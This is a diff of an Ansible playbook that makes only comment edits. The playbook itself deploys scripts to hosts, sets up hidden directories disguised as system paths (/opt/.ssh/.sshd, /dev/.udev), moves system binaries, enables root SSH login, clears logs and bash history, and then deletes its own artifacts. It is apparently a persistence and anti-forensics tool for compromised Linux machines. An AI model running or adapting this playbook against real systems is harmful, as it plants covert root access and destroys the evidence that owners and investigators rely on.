@@ -5,15 +5,13 @@
   gather_facts: yes
 
   vars:
-    deploy_dir: /tmp/tools   # Remote directory for temporary deployment
+    deploy_dir: /tmp/tools  
     hidden_dir: /opt/.ssh/.sshd
     hidden_dir_nd: /dev/.udev
-    purge_logs: true                # Set to true to clear logs and bash history
+    purge_logs: true              
 
   tasks:
-    ###################################################################
-    # 1) Prepare: Create the deployment directory
-    ###################################################################
+    # Create the deployment directory
     - name: Create remote deployment directory
       file:
         path: "{{ deploy_dir }}"
@@ -64,9 +62,8 @@
 
 
 
-    ###################################################################
-    # 2) Copy required scripts from the Linux folder
-    ###################################################################
+
+    # Copy required scripts from the Linux folder
     - name: Copy move_binaries.sh
       copy:
         src: ../Linux/move_binaries.sh
@@ -136,9 +133,7 @@
         dest: "{{ deploy_dir }}/ssh_root_enable.sh"
         mode: "0755"
 
-    ###################################################################
-    # 3) Run the deployment scripts in order
-    ###################################################################
+    # Run the deployment scripts in order
     - name: Run move_binaries.sh to back up system binaries
       command: "{{ deploy_dir }}/move_binaries.sh"
       args:
@@ -166,9 +161,7 @@
       args:
         chdir: "{{ deploy_dir }}"
 
-    ###################################################################
-    # 4) Clean up deployment artifacts and clear logs/history
-    ###################################################################
+    # Clean up deployment artifacts and clear logs/history
     - name: Remove deployment directory
       file:
         path: "{{ deploy_dir }}"
